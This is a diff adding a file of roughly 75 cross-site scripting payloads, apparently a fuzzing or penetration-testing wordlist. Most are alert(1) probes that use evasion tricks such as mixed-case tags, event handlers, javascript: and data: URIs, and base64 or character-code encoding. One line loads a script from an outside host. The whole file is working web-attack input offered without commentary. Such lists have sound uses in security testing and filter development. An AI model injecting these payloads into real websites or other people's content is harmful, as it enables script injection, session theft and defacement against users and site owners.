@@ -1,0 +1,75 @@
+<script>alert(1)</script>  
+"><script>alert(1)</script>  
+'><script>alert(1)</script>  
+</script><script>alert(1)</script>  
+<img src=x onerror=alert(1)>  
+<svg onload=alert(1)>  
+<iframe src="javascript:alert(1)"></iframe>  
+<body onload=alert(1)>  
+<input type="text" value="XSS" onfocus=alert(1) autofocus>  
+<a href="javascript:alert(1)">Click me</a>  
+<iframe srcdoc="<script>alert(1)</script>"></iframe>  
+<svg><script>alert(1)</script></svg>  
+<object data="javascript:alert(1)"></object>  
+<embed src="javascript:alert(1)">  
+<math><mtext></mtext><mtext><script>alert(1)</script></mtext></math>  
+<form><button formaction="javascript:alert(1)">Click</button></form>  
+<button onclick="alert(1)">Click</button>  
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">  
+<style>*{x:expression(alert(1))}</style>  
+<link rel="stylesheet" href="javascript:alert(1)">  
+<marquee loop=1 width=0 onfinish=alert(1)>  
+<details open ontoggle=alert(1)>  
+<video><source onerror=alert(1)></video>  
+<audio oncanplay=alert(1)><source></audio>  
+<div onmouseover=alert(1)>Hover me</div>  
+<form action="javascript:alert(1)"><input type="submit"></form>  
+<a href="#" onclick="alert(1)">Click</a>  
+<img src=x oNerror=alert(1)>  
+<img src=x oneRRor=alert(1)>  
+<sCript>alert(1)</sCript>  
+<scRipT>alert(1)</scRipT>  
+<sVg onload=alert(1)>  
+<svg/onload=alert(1)>  
+javascript:alert(1)//  
+JaVaScRiPt:alert(1)  
+" onmouseover="alert(1)  
+<script src=data:text/javascript,alert(1)></script>  
+";alert(1);//  
+';alert(1);//  
+</title><script>alert(1)</script>  
+<img src=x onerror="this.src='x';alert(1)">  
+<iframe src=javascript:alert(1)>  
+<script>document.write('<img src=x onerror=alert(1)>')</script>  
+<svg/onload=alert(1)>  
+<script src=//0x414141.com/xss.js></script>  
+<script>eval('String.fromCharCode(97,108,101,114,116,40,49,41)')</script>  
+<script>eval(atob('YWxlcnQoMSk='))</script>  
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>  
+<iframe srcdoc="&lt;script>alert(1)&lt;/script>"></iframe>  
+<body background="javascript:alert(1)">  
+<video><source onerror=eval(atob('YWxlcnQoMSk='))></video>  
+<svg><a xlink:href="javascript:alert(1)">Click me</a></svg>  
+<math><maction actiontype="statusline" xlink:href="javascript:alert(1)"></maction></math>  
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">  
+<form action="data:text/html,<script>alert(1)</script>"><input type="submit"></form>  
+<form><button formaction="javascript:alert(1)">Click</button></form>  
+<style>@keyframes x{0%{opacity:1}to{opacity:0}}body{animation:x 1s infinite}body::before{content:"XSS";font-size:50px;color:red}</style>  
+<style>@import'javascript:alert(1)';</style>  
+<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>  
+<script>window.onerror=function(){alert(1)};throw 'XSS'</script>  
+<script>document.body.innerHTML="<h1>XSS</h1>"</script>  
+<script>history.pushState('', '', 'javascript:alert(1)')</script>  
+<script>location.replace('javascript:alert(1)')</script>  
+<script>location.href='javascript:alert(1)'</script>  
+<script>document.location='javascript:alert(1)'</script>  
+<script>setTimeout('alert(1)',100)</script>  
+<script>setInterval('alert(1)',1000)</script>  
+<script>setTimeout(Function("alert(1)"),1000)</script>  
+<script>setInterval(Function("alert(1)"),1000)</script>  
+<script>document.write('<img src=x onerror=alert(1)>')</script>  
+<link rel=import href=data:text/html,<script>alert(1)</script>>  
+<link rel="prefetch" href="javascript:alert(1)">  
+<link rel="prerender" href="javascript:alert(1)">  
+<script>document.body.appendChild(document.createElement('iframe')).src='javascript:alert(1)'</script>  
+<script>var i=document.createElement('iframe'); i.src='javascript:alert(1)'; document.body.appendChild(i);</script>  
